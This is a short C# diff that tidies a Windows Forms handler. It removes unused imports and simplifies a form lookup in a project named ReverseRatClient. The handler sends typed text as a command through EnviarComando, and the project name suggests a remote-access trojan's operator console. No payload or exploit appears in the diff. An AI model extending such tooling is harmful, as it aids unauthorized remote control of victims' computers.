@@ -1,9 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Text;
 using System.Windows.Forms;
 
 namespace ReverseRatClient
@@ -18,9 +13,7 @@ namespace ReverseRatClient
 
         private void button3_Click(object sender, EventArgs e)
         {
-          
-            Principal pc= new Principal();
-            pc = (Principal)Msc.DevolverMDI("Principal");
+            var pc = (Principal)Msc.DevolverMDI("Principal");
             pc.EnviarComando(textBox2.Text, Text);
             if (textBox2.Text == @"cls") textBox1.Text = "";
             textBox2.Text = "";
